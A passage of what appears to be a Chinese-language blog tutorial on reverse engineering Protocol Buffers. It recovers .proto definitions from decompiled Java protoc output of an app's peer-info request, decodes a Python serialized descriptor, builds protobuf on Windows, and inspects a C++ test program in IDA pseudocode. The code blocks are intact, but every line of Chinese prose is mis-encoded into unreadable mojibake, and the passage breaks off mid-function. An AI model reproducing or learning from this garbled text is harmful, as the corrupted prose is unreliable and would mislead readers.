class="string">&quot;\u0000\u0015\u0000\u0000\u0001\u0015\u0015\u0000\u0001\u0000\u0001Èˆ\u0002Èˆ\u0003\f\u0004\u0002\u0005\u0004\u0006\u0004\u0007&#x27;\b\u0004\tÈˆ\n\f\u000b\f\fÈˆ\r\u0004\u000e\u0002\u000f\u0002\u0010\u0002\u0011\u0002\u0012\f\u0013Èˆ\u0014\u0004\u0015\f&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;deviceId_&quot;</span>, <span class="string">&quot;resourceId_&quot;</span>, <span class="string">&quot;resourceType_&quot;</span>, <span class="string">&quot;resourceSize_&quot;</span>, <span class="string">&quot;sessionId_&quot;</span>, <span class="string">&quot;bitrate_&quot;</span>, <span class="string">&quot;subSegment_&quot;</span>, <span class="string">&quot;segmentId_&quot;</span>, <span class="string">&quot;resourceAvid_&quot;</span>, <span class="string">&quot;playType_&quot;</span>, <span class="string">&quot;natType_&quot;</span>, <span class="string">&quot;resourceUrl_&quot;</span>, <span class="string">&quot;liveSegment_&quot;</span>, <span class="string">&quot;seasonId_&quot;</span>, <span class="string">&quot;episodeId_&quot;</span>, <span class="string">&quot;upMid_&quot;</span>, <span class="string">&quot;uploadUtcTimestamp_&quot;</span>, <span class="string">&quot;manuscriptType_&quot;</span>, <span class="string">&quot;transId_&quot;</span>, <span class="string">&quot;peerNeedCount_&quot;</span>, <span class="string">&quot;uploadPriority_&quot;</span>&#125;);</span><br><span class="line">           <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">               <span class="keyword">return</span> DEFAULT_INSTANCE;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">               GeneratedMessageLite.<span class="type">DefaultInstanceBasedParser</span> <span class="variable">defaultInstanceBasedParser</span> <span class="operator">=</span> PARSER;</span><br><span class="line">               <span class="keyword">if</span> (defaultInstanceBasedParser == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">synchronized</span> (GetPeerInfoRequest.class) &#123;</span><br><span class="line">                       defaultInstanceBasedParser = PARSER;</span><br><span class="line">                       <span class="keyword">if</span> (defaultInstanceBasedParser == <span class="literal">null</span>) &#123;</span><br><span class="line">                           defaultInstanceBasedParser = <span class="keyword">new</span> <span class="title class_">GeneratedMessageLite</span>.DefaultInstanceBasedParser(DEFAULT_INSTANCE);</span><br><span class="line">                           PARSER = defaultInstanceBasedParser;</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">return</span> defaultInstanceBasedParser;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">               <span class="keyword">return</span> (<span class="type">byte</span>) <span class="number">1</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°ä¸­è°ƒç”¨ GeneratedMessageLite.newMessageInfo çš„ä½ç½®åŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œå…¶ä¸­å…ƒç´ å°±æ˜¯åŸå§‹å¯¹è±¡å®šä¹‰çš„å„ä¸ªå˜é‡åã€‚</p>
<p>ä»¥ <code>deviceId_</code> ä¸ºä¾‹ï¼Œåœ¨ç±»æˆå‘˜ä¸­æ‰¾åˆ° <code>DEVICE_ID_FIELD_NUMBER = 1</code>ï¼Œè¯´æ˜åœ¨åŸå§‹å®šä¹‰ä¸­å­˜åœ¨ä¸€ä¸ªå«åš deviceId çš„å˜é‡ï¼Œå®ƒå¯¹åº”ç¼–å·ä¸º 1ï¼Œæ¥ç€æ‰¾åˆ° <code>private String deviceId_ = com.redacted.nativelibrary.b.d;</code>ï¼Œè¯´æ˜ deviceId å˜é‡åº”è¯¥æ˜¯ä¸€ä¸ª string ç±»å‹ã€‚</p>
<p>è¿™æ ·å°±æ¨æµ‹å‡ºåŸå§‹ proto å¯¹è±¡è‚¯å®šå­˜åœ¨è¿™æ ·ä¸€æ¡å®šä¹‰ï¼š<code>string deviceId = 1;</code></p>
<p>æŒ‰ç…§è¿™ç§æ¨¡å¼å°†æ‰€æœ‰å˜é‡è¿›è¡Œè¿˜åŸï¼Œç”±äºæ•°æ®å…·æœ‰è¾ƒé«˜çš„ç»“æ„åŒ–ç¨‹åº¦ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨ AI å®ç°è‡ªåŠ¨åŒ–è¿˜åŸã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç°åœ¨æœ‰ä¸€ä¸ªç»è¿‡ protoc ç¼–è¯‘å¾—åˆ°çš„ java æ–‡ä»¶ï¼Œè¯·æ ¹æ®ä»¥ä¸‹ä¿¡æ¯è¿˜åŸ proto å¯¹è±¡å®šä¹‰</span><br><span class="line">&lt;é™„åŠ ä»¥ä¸Šä»£ç &gt;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">GetPeerInfoRequest</span> &#123;</span><br><span class="line">  <span class="type">string</span> device_id = <span class="number">1</span>;</span><br><span class="line">  <span class="type">string</span> resource_id = <span class="number">2</span>;</span><br><span class="line">  <span class="type">int32</span> resource_type = <span class="number">3</span>;</span><br><span class="line">  <span class="type">int64</span> resource_size = <span class="number">4</span>;</span><br><span class="line">  <span class="type">int32</span> session_id = <span class="number">5</span>;</span><br><span class="line">  <span class="type">int32</span> bitrate = <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">repeated</span> <span class="type">int32</span> sub_segment = <span class="number">7</span>;</span><br><span class="line">  <span class="type">int32</span> segment_id = <span class="number">8</span>;</span><br><span class="line">  <span class="type">string</span> resource_avid = <span class="number">9</span>;</span><br><span class="line">  <span class="type">int32</span> play_type = <span class="number">10</span>;</span><br><span class="line">  <span class="type">int32</span> nat_type = <span class="number">11</span>;</span><br><span class="line">  <span class="type">string</span> resource_url = <span class="number">12</span>;</span><br><span class="line">  <span class="type">int32</span> live_segment = <span class="number">13</span>;</span><br><span class="line">  <span class="type">int64</span> season_id = <span class="number">14</span>;</span><br><span class="line">  <span class="type">int64</span> episode_id = <span class="number">15</span>;</span><br><span class="line">  <span class="type">int64</span> up_mid = <span class="number">16</span>;</span><br><span class="line">  <span class="type">int64</span> upload_utc_timestamp = <span class="number">17</span>;</span><br><span class="line">  <span class="type">int32</span> manuscript_type = <span class="number">18</span>;</span><br><span class="line">  <span class="type">string</span> trans_id = <span class="number">19</span>;</span><br><span class="line">  <span class="type">int32</span> peer_need_count = <span class="number">20</span>;</span><br><span class="line">  <span class="type">int32</span> upload_priority = <span class="number">21</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æœ€ç»ˆç»“æœå¯èƒ½å’Œä»£ç å­˜åœ¨è¯¯å·®ï¼Œä¸è¿‡å¤§éƒ¨åˆ†ç»“æ„å·²ç»æˆåŠŸæ¢å¤ã€‚</p>
<h2 id="Python-ä¸­çš„-Protobuf"><a href="#Python-ä¸­çš„-Protobuf" class="headerlink" title="Python ä¸­çš„ Protobuf"></a>Python ä¸­çš„ Protobuf</h2><p>è¿˜æ˜¯ä»¥ SimpleMessage ä¸ºä¾‹ï¼Œä½¿ç”¨ protoc ç¼–è¯‘åå¾—åˆ°çš„æ–‡ä»¶åˆ™éå¸¸ç®€å•</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Generated by the protocol buffer compiler.  DO NOT EDIT!</span></span><br><span class="line"><span class="comment"># source: simple.proto</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;Generated protocol buffer code.&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">from</span> google.protobuf.internal <span class="keyword">import</span> builder <span class="keyword">as</span> _builder</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor <span class="keyword">as</span> _descriptor</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> descriptor_pool <span class="keyword">as</span> _descriptor_pool</span><br><span class="line"><span class="keyword">from</span> google.protobuf <span class="keyword">import</span> symbol_database <span class="keyword">as</span> _symbol_database</span><br><span class="line"><span class="comment"># @@protoc_insertion_point(imports)</span></span><br><span class="line"></span><br><span class="line">_sym_db = _symbol_database.Default()</span><br><span class="line"></span><br><span class="line">DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(<span class="string">b&#x27;\n\x0csimple.proto\x12\x0e\x65xample.simple\&quot;Q\n\rSimpleMessage\x12\n\n\x02id\x18\x01 \x01(\x05\x12\x11\n\tis_simple\x18\x02 \x01(\x08\x12\x0c\n\x04name\x18\x03 \x01(\t\x12\x13\n\x0bsample_list\x18\x04 \x03(\x05\x62\x06proto3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, <span class="built_in">globals</span>())</span><br><span class="line">_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, <span class="string">&#x27;simple_pb2&#x27;</span>, <span class="built_in">globals</span>())</span><br><span class="line"><span class="keyword">if</span> _descriptor._USE_C_DESCRIPTORS == <span class="literal">False</span>:</span><br><span class="line"></span><br><span class="line">  DESCRIPTOR._options = <span class="literal">None</span></span><br><span class="line">  _SIMPLEMESSAGE._serialized_start=<span class="number">32</span></span><br><span class="line">  _SIMPLEMESSAGE._serialized_end=<span class="number">113</span></span><br><span class="line"><span class="comment"># @@protoc_insertion_point(module_scope)</span></span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥ç¼–å†™ä»¥ä¸‹ä»£ç å°†æè¿°ä¿¡æ¯è¿›è¡Œè§£ç </p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> google.protobuf.descriptor_pb2 <span class="keyword">import</span> FileDescriptorProto</span><br><span class="line"></span><br><span class="line">proto = FileDescriptorProto()</span><br><span class="line">proto.ParseFromString(<span class="string">b&#x27;\n\x0csimple.proto\x12\x0e\x65xample.simple\&quot;Q\n\rSimpleMessage\x12\n\n\x02id\x18\x01 \x01(\x05\x12\x11\n\tis_simple\x18\x02 \x01(\x08\x12\x0c\n\x04name\x18\x03 \x01(\t\x12\x13\n\x0bsample_list\x18\x04 \x03(\x05\x62\x06proto3&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(proto)</span><br></pre></td></tr></table></figure></div>

<p>ç”±äº Python çš„ç‰¹æ€§ï¼Œåœ¨ä¸€å®šç‰ˆæœ¬èŒƒå›´å†…å¯ä»¥ç›´æ¥é€šè¿‡å·¥å…·åç¼–è¯‘å¾—åˆ°æºä»£ç ï¼Œä¸”ç»è¿‡æµ‹è¯•å‘ç°æ˜¯å¦æŒ‡å®š LITE_RUNTIME æ¨¡å¼ä¼¼ä¹å¯¹ç”Ÿæˆçš„ç»“æœæ— å½±å“ï¼Œéƒ½èƒ½é€šè¿‡è§£ææè¿°ä¿¡æ¯æ¥è¿˜åŸåŸå§‹ç»“æ„ã€‚</p>
<h2 id="C-ä¸­çš„-Protobuf"><a href="#C-ä¸­çš„-Protobuf" class="headerlink" title="C++ ä¸­çš„ Protobuf"></a>C++ ä¸­çš„ Protobuf</h2><p>é¦–å…ˆæ­å»ºä¸€ä¸ªç¼–è¯‘ç¯å¢ƒç”¨æ¥ç”Ÿæˆæµ‹è¯•ç¨‹åºï¼Œä»¥ä¸‹æ“ä½œåœ¨ Windows ä¸­è¿›è¡Œã€‚</p>
<h3 id="æ­å»ºç¼–è¯‘ç¯å¢ƒ"><a href="#æ­å»ºç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="æ­å»ºç¼–è¯‘ç¯å¢ƒ"></a>æ­å»ºç¼–è¯‘ç¯å¢ƒ</h3><p>ç³»ç»Ÿè¦å®‰è£… Visual Studioã€Cmakeã€git å·¥å…·ï¼Œä¸‹è½½ <a class="link"   href="https://github.com/protocolbuffers/protobuf/releases" >protobuf æºä»£ç <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>ï¼Œé€‰æ‹© Source Code ä¸‹è½½åˆ°æœ¬åœ°å¹¶è§£å‹ï¼Œç„¶åæ‰“å¼€åˆšåˆšè§£å‹å‡ºæ¥çš„ç›®å½•ï¼Œåœ¨é‡Œé¢åˆ›å»ºä¸€ä¸ª build æ–‡ä»¶å¤¹ï¼Œåœ¨ build æ–‡ä»¶å¤¹ä¸­æ–°å»ºä¸€ä¸ª output æ–‡ä»¶å¤¹ã€‚<br>è¿›å…¥ third_party&#x2F;abseil-cpp ç›®å½•ï¼Œæ‰“å¼€ç»ˆç«¯ï¼Œæ‰§è¡Œå‘½ä»¤</p>
<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/abseil/abseil<span class="literal">-cpp</span></span><br></pre></td></tr></table></figure></div>
<p>ç­‰å¾…å…‹éš†å®Œæ¯•ä¹‹åï¼ŒæŠŠ abseil-cpp ç›®å½•ä¸‹çš„å†…å®¹å¤åˆ¶åˆ°å¤–å±‚ç›®å½•ã€‚</p>
<p>æ‰“å¼€ Cmake GUIï¼Œæºä»£ç è·¯å¾„é€‰æ‹© protobuf æ ¹ç›®å½•ï¼Œè¾“å‡ºè·¯å¾„é€‰æ‹©åˆšåˆšåˆ›å»ºçš„ build æ–‡ä»¶å¤¹ï¼Œç„¶åç‚¹å‡» Configure</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-1.png"
                     
                ></p>
<p>å¼¹å‡ºçš„æ–°çª—å£ä¸­æ¶æ„è¾“å…¥ x64ï¼Œç‚¹å‡»å®Œæˆã€‚<br>ç­‰å¾…é¡¹ç›®é…ç½®ï¼ŒæœŸé—´å¯èƒ½ä¼šæŠ¥é”™æ‰¾ä¸åˆ° googletest æ–‡ä»¶å¤¹ï¼Œæ­¤æ—¶åœ¨ä¸­é—´çš„çº¢è‰²åŒºåŸŸæ‰¾åˆ° <code>protobuf_BUILD_TESTS</code> é¡¹ç›®ï¼Œå°†å‹¾é€‰å–æ¶ˆï¼ŒåŒæ—¶ä¿®æ”¹ CMAKE_INSTALL_PREFIX é¡¹ç›®ä¸º build&#x2F;outputã€‚<br>å†ç‚¹å‡» Configureï¼Œæ—¥å¿—ä¸­ä¼šè¾“å‡º Configuring doneï¼Œç‚¹å‡» Generateï¼Œè¾“å‡º Generating done æ—¶è¡¨ç¤º Cmake é…ç½®å®Œæˆã€‚</p>
<p>è¿›å…¥ build ç›®å½•ï¼Œæ‰“å¼€ protobuf.sln è§£å†³æ–¹æ¡ˆï¼Œç¡®ä¿ä¸Šæ–¹ç¼–è¯‘å‚æ•°ä¸º Debugã€x64ï¼Œåœ¨è§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨ä¸­å³é”®æœ€ä¸Šé¢çš„æ¡ç›®ï¼Œé€‰æ‹©ç”Ÿæˆè§£å†³æ–¹æ¡ˆï¼Œç­‰å¾…ç¼–è¯‘å®Œæˆã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-2.png"
                     
                ></p>
<p>å³é”®ç‚¹å‡» CMakePredefinedTargets&#x2F;INSTALL æ¡ç›®ï¼Œé€‰æ‹©ç”Ÿæˆï¼Œç­‰å¾…å®‰è£…å®Œæ¯•ï¼Œåœ¨ build&#x2F;output ç›®å½•ä¸‹å³å¯çœ‹åˆ°ç¼–è¯‘å®Œæˆçš„é“¾æ¥åº“å’Œ protoc.exe ç¼–è¯‘å™¨ã€‚</p>
<h3 id="ç¼–å†™æµ‹è¯•é¡¹ç›®"><a href="#ç¼–å†™æµ‹è¯•é¡¹ç›®" class="headerlink" title="ç¼–å†™æµ‹è¯•é¡¹ç›®"></a>ç¼–å†™æµ‹è¯•é¡¹ç›®</h3><p>æ–°å»ºä¸€ä¸ª testProto.proto æ–‡ä»¶ï¼Œå¡«å†™ä»¥ä¸‹å†…å®¹</p>
<div class="code-container" data-rel="Protobuf"><figure class="iseeu highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;  </span><br><span class="line"><span class="keyword">package</span> mypb;  </span><br><span class="line"><span class="keyword">message </span><span class="title class_">helloworld</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="keyword">optional</span> <span class="type">int32</span> id = <span class="number">1</span>;  </span><br><span class="line">    <span class="keyword">optional</span> <span class="type">string</span> str = <span class="number">2</span>;  </span><br><span class="line">    <span class="keyword">optional</span> <span class="type">int32</span> num = <span class="number">3</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•ç»“æ„ï¼Œå®šä¹‰äº†ä¸€ä¸ª helloworld å¯¹è±¡ï¼Œå…·æœ‰ 3 ä¸ªæˆå‘˜ï¼Œidã€str å’Œ numï¼ŒæŠŠæ–‡ä»¶æ”¾åœ¨å’Œ protoc.exe ç›¸åŒç›®å½•ä¸‹ï¼Œç”¨ protoc ç¼–è¯‘</p>
<div class="code-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">protoc.exe testProto.proto <span class="literal">--cpp_out</span>=.\</span><br></pre></td></tr></table></figure></div>
<p>æ‰§è¡ŒæˆåŠŸï¼Œä¼šç”Ÿæˆ testProto.pb.cc å’Œ testProto.pb.h ä¸¤ä¸ªæ–‡ä»¶ã€‚å¯ä»¥æ‰“å¼€è¿™ä¸¤ä¸ªæ–‡ä»¶çœ‹çœ‹ proto å¯¹è±¡ç»è¿‡ protoc å¤„ç†åå˜æˆäº†ä»€ä¹ˆæ ·å­ï¼Œä¸è¿‡æˆ‘ä»¬ä¸»è¦å…³å¿ƒåœ¨é€†å‘è¿‡ç¨‹ä¸­å¦‚ä½•æ¢å¤ proto ç»“æ„ï¼Œæ‰€ä»¥å…ˆç»§ç»­å®Œæˆç¼–è¯‘è¿‡ç¨‹ã€‚</p>
<p>åœ¨ VS ä¸­æ–°å»ºä¸€ä¸ªç©ºç™½ C++ é¡¹ç›®ï¼ŒæŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åœ¨æ–°é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹ï¼Œæ‰“å¼€é¡¹ç›®ï¼Œå³ä¾§è§£å†³æ–¹æ¡ˆç®¡ç†å™¨ä¸­åˆ†åˆ«å°† testProto.pb.cc å’Œ testProto.pb.h æ·»åŠ åˆ° æºæ–‡ä»¶ã€å¤´æ–‡ä»¶ï¼Œæ–°å»ºä¸€ä¸ª main.cppï¼Œå¡«å†™ä»¥ä¸‹å†…å®¹</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;testProto.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//æ¶ˆæ¯å°è£…</span></span><br><span class="line">	mypb::helloworld in_msg;</span><br><span class="line">	&#123;</span><br><span class="line">		in_msg.<span class="built_in">set_id</span>(<span class="number">9</span>);</span><br><span class="line">		in_msg.<span class="built_in">set_str</span>(<span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">		<span class="function">std::fstream <span class="title">output</span><span class="params">(<span class="string">&quot;./hello.log&quot;</span>, std::ios::out | std::ios::trunc | std::ios::binary)</span></span>;</span><br><span class="line">		<span class="keyword">if</span> (!in_msg.<span class="built_in">SerializeToOstream</span>(&amp;output)) &#123;</span><br><span class="line">			std::cerr &lt;&lt; <span class="string">&quot;failed to serialize in_msg&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//æ¶ˆæ¯è§£æ</span></span><br><span class="line">	mypb::helloworld out_msg;</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function">std::fstream <span class="title">input</span><span class="params">(<span class="string">&quot;./hello.log&quot;</span>, std::ios::in | std::ios::binary)</span></span>;</span><br><span class="line">		<span class="keyword">if</span> (!out_msg.<span class="built_in">ParseFromIstream</span>(&amp;input)) &#123;</span><br><span class="line">			std::cerr &lt;&lt; <span class="string">&quot;failed to parse&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout &lt;&lt; out_msg.<span class="built_in">id</span>() &lt;&lt; std::endl;</span><br><span class="line">		std::cout &lt;&lt; out_msg.<span class="built_in">str</span>() &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-3.png"
                     
                ></p>
<p>å³é”®ç‚¹å‡» testProto é¡¹ç›®ï¼Œé€‰æ‹©å±æ€§ -&gt; C&#x2F;C++ -&gt; å¸¸è§„ï¼Œä¿®æ”¹<strong>é™„åŠ åŒ…å«ç›®å½•</strong>ï¼Œå¡«å†™ build&#x2F;output&#x2F;includeï¼Œå†é€‰æ‹©é“¾æ¥å™¨ -&gt; å¸¸è§„ï¼Œä¿®æ”¹<strong>é™„åŠ åº“ç›®å½•</strong>ï¼Œå¡«å†™ build&#x2F;output&#x2F;libï¼Œé€‰æ‹©é“¾æ¥å™¨ -&gt; è¾“å…¥ï¼Œä¿®æ”¹<strong>é™„åŠ ä¾èµ–é¡¹</strong>ï¼Œå¡«å†™ä»¥ä¸‹å†…å®¹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">libprotobufd.lib;libprotocd.lib;absl_bad_any_cast_impl.lib;absl_bad_optional_access.lib;absl_bad_variant_access.lib;absl_base.lib;absl_city.lib;absl_civil_time.lib;absl_cord.lib;absl_cord_internal.lib;absl_cordz_functions.lib;absl_cordz_handle.lib;absl_cordz_info.lib;absl_cordz_sample_token.lib;absl_crc32c.lib;absl_crc_cord_state.lib;absl_crc_cpu_detect.lib;absl_crc_internal.lib;absl_debugging_internal.lib;absl_demangle_internal.lib;absl_die_if_null.lib;absl_examine_stack.lib;absl_exponential_biased.lib;absl_failure_signal_handler.lib;absl_flags.lib;absl_flags_commandlineflag.lib;absl_flags_commandlineflag_internal.lib;absl_flags_config.lib;absl_flags_internal.lib;absl_flags_marshalling.lib;absl_flags_parse.lib;absl_flags_private_handle_accessor.lib;absl_flags_program_name.lib;absl_flags_reflection.lib;absl_flags_usage.lib;absl_flags_usage_internal.lib;absl_graphcycles_internal.lib;absl_hash.lib;absl_hashtablez_sampler.lib;absl_int128.lib;absl_kernel_timeout_internal.lib;absl_leak_check.lib;absl_log_entry.lib;absl_log_flags.lib;absl_log_globals.lib;absl_log_initialize.lib;absl_log_internal_check_op.lib;absl_log_internal_conditions.lib;absl_log_internal_fnmatch.lib;absl_log_internal_format.lib;absl_log_internal_globals.lib;absl_log_internal_log_sink_set.lib;absl_log_internal_message.lib;absl_log_internal_nullguard.lib;absl_log_internal_proto.lib;absl_log_severity.lib;absl_log_sink.lib;absl_low_level_hash.lib;absl_malloc_internal.lib;absl_periodic_sampler.lib;absl_random_distributions.lib;absl_random_internal_distribution_test_util.lib;absl_random_internal_platform.lib;absl_random_internal_pool_urbg.lib;absl_random_internal_randen.lib;absl_random_internal_randen_hwaes.lib;absl_random_internal_randen_hwaes_impl.lib;absl_random_internal_randen_slow.lib;absl_random_internal_seed_material.lib;absl_random_seed_gen_exception.lib;absl_random_seed_sequences.lib;absl_raw_hash_set.lib;absl_raw_logging_internal.lib;absl_scoped_set_env.lib;absl_spinlock_wait.lib;absl_stacktrace.lib;absl_status.lib;absl_statusor.lib;absl_str_format_internal.lib;absl_strerror.lib;absl_string_view.lib;absl_strings.lib;absl_strings_internal.lib;absl_symbolize.lib;absl_synchronization.lib;absl_throw_delegate.lib;absl_time.lib;absl_time_zone.lib;utf8_range.lib;utf8_validity.lib;%(AdditionalDependencies)</span><br></pre></td></tr></table></figure></div>

<p>ä¿®æ”¹å®Œæˆï¼Œç‚¹å‡»ç¡®å®šï¼Œç„¶åç‚¹å‡»ç»¿è‰²ç®­å¤´ç¼–è¯‘å¹¶æ‰§è¡Œ main.cpp</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/protobuf-4.png"
                     
                ></p>
<h3 id="é€†å‘åˆ†æç¨‹åº"><a href="#é€†å‘åˆ†æç¨‹åº" class="headerlink" title="é€†å‘åˆ†æç¨‹åº"></a>é€†å‘åˆ†æç¨‹åº</h3><p>åœ¨é¡¹ç›®çš„ x64&#x2F;Debug ç›®å½•ä¸‹æ‰¾åˆ°ç”Ÿæˆçš„ testProto.exe ç¨‹åºï¼Œä½¿ç”¨ IDA æ‰“å¼€åˆ†æã€‚æ ¹æ®å­—ç¬¦ä¸²å¯ä»¥å…ˆæ‰¾åˆ°ä¸»å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_14035E010</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v12;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">222</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140326B0A(&amp;unk_140CD0147);</span><br><span class="line">  sub_1403100DF(v13);</span><br><span class="line">  sub_14031213C(v13, <span class="number">9</span>i64);</span><br><span class="line">  sub_14031CDD0(v13, <span class="string">&quot;Jack&quot;</span>);</span><br><span class="line">  sub_140322E8D(v14, <span class="number">280</span>i64);</span><br><span class="line">  sub_140323658(v14, <span class="string">&quot;./hello.log&quot;</span>, <span class="number">50</span>, <span class="number">64</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">    v21 = &amp;v15;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v21 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( sub_14030D448(v13, v21) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_140321DF8(v14);</span><br><span class="line">    sub_1403100DF(v16);</span><br><span class="line">    sub_140322E8D(v17, <span class="number">280</span>i64);</span><br><span class="line">    sub_140323658(v17, <span class="string">&quot;./hello.log&quot;</span>, <span class="number">33</span>, <span class="number">64</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sub_140328E1E(v16, v17) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = sub_140322208(v16);</span><br><span class="line">      v6 = sub_14030DE2A(&amp;unk_140C57C50, v5);</span><br><span class="line">      sub_140318221(v6, sub_14030A1EE);</span><br><span class="line">      v7 = sub_14031FAA3(v16);</span><br><span class="line">      v8 = sub_1403230EF(&amp;unk_140C57C50, v7);</span><br><span class="line">      sub_140318221(v8, sub_14030A1EE);</span><br><span class="line">      sub_140321DF8(v17);</span><br><span class="line">      sub_140320E3A();</span><br><span class="line">      v20 = <span class="number">0</span>;</span><br><span class="line">      sub_14031BC23(v16);</span><br><span class="line">      sub_14031BC23(v13);</span><br><span class="line">      v3 = v20;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = sub_14030BFD0(&amp;qword_140C57DA0, <span class="string">&quot;failed to parse&quot;</span>);</span><br><span class="line">      sub_140318221(v4, sub_14030A1EE);</span><br><span class="line">      v19 = <span class="number">-1</span>;</span><br><span class="line">      sub_140321DF8(v17);</span><br><span class="line">      sub_14031BC23(v16);</span><br><span class="line">      sub_14031BC23(v13);</span><br><span class="line">      v3 = v19;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = sub_14030BFD0(&amp;qword_140C57DA0, <span class="string">&quot;failed to serialize in_msg&quot;</span>);</span><br><span class="line">    sub_140318221(v2, sub_14030A1EE);</span><br><span class="line">    v18 = <span class="number">-1</span>;</span><br><span class="line">    sub_140321DF8(v14);</span><br><span class="line">    sub_14031BC23(v13);</span><br><span class="line">    v3 = v18;</span><br><span class="line">  